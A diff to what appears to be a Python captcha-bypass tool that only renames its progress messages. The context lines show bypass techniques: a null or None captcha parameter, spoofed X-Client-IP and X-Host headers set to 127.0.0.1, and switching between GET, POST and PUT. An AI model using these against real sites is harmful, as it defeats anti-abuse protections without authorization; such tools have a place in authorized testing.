@@ -13,7 +13,7 @@ def bypass_method_1_get(url: str, req: str, token = None):
             return 0
     form_data = list_to_dict(req)
     response = r.get(url, params=form_data, headers=headers)
-    print("Trying method 1..")
+    print("Trying Captcha param None method..")
     try:
         for key in form_data:
             if key == token:
@@ -52,7 +52,7 @@ def bypass_method_2_get(url: str, req: str, token = None):
             return 0
     form_data = list_to_dict(req)
     response = r.get(url, params=form_data, headers=headers)
-    print("Trying method 2..")
+    print("Trying Captcha param Null method..")
     try:
         for key in form_data:
             if key == token:
@@ -99,7 +99,7 @@ def bypass_method_3_get(url: str, req: str, token = None):
     headers["X-Client-IP"] = "127.0.0.1"
     headers["X-Host"] = "127.0.0.1"
 
-    print("Trying method 3..")
+    print("Trying Add Header method..")
     try:
         new_response = r.get(url, params=form_data, headers=headers)
         if "40" not in str(response.status_code) and "50" not in str(response.status_code) and response.status_code == new_response.status_code:
@@ -134,7 +134,7 @@ def bypass_method_4_post(url: str, req: str, token = None):
     form_data = list_to_dict(req)
     response = r.get(url, params=form_data, headers=headers)
 
-    print("Trying method 4.1..")
+    print("Trying POST->GET/GET->POST method..")
     try:
         new_response = r.post(url, form_data, headers)
         if "40" not in str(response.status_code) and "50" not in str(response.status_code) and response.status_code == new_response.status_code:
@@ -169,7 +169,7 @@ def bypass_method_4_put(url: str, req: str, token = None):
     form_data = list_to_dict(req)
     response = r.get(url, params=form_data, headers=headers)
 
-    print("Trying method 4.2..")
+    print("Trying POST->PUT/GET->PUT method..")
     try:
         new_response = r.put(url, data=form_data, headers=headers)
         if "40" not in str(response.status_code) and "50" not in str(response.status_code) and response.status_code == new_response.status_code:
